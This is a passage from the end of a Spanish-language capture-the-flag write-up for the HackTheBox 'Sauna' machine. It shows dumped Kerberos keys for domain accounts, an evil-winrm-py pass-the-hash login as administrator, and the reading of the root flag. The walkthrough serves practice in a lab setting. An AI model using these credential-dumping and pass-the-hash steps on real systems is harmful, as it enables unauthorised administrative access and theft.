EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:a99744bd449500dc14a9a7cfc0217c8c4a3892633fc0395a92936cac433e471d
SAUNA$:aes128-cts-hmac-sha1-96:efd5c5aebf50090c52cc0c2e9d09f982
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

- Obtuve los hashes de todos los usuarios incluidos el administrador.

Con este hash puedo conectarme via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ evil-winrm-py -i 10.129.95.180 -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.95.180:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Desktop> whoami
egotisticalbank\administrator
evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
01046bb547d652e5ed68*****
```

***PWNED***

![](assets/Pasted%20image%2020260131002238.png)
